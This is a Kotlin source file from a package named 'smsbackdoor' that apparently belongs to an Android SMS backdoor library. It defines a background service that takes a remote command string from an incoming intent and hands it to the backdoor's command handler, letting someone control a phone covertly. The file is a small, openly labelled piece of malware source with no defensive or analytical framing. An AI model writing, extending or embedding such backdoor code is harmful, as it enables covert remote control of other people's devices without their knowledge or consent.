package com.evilthreads.smsbackdoor

import android.content.Intent
import com.evilthreads.wakeservicelib.WakeService

class RemoteCommandExecutor: WakeService("RemoteCommandExecutor"){
    override fun Intent.doWork(){
        getStringExtra(SmsBackdoor.KEY_REMOTE_COMMAND)?.let { command -> SmsBackdoor.commandHandler?.invoke(command) }
    }
}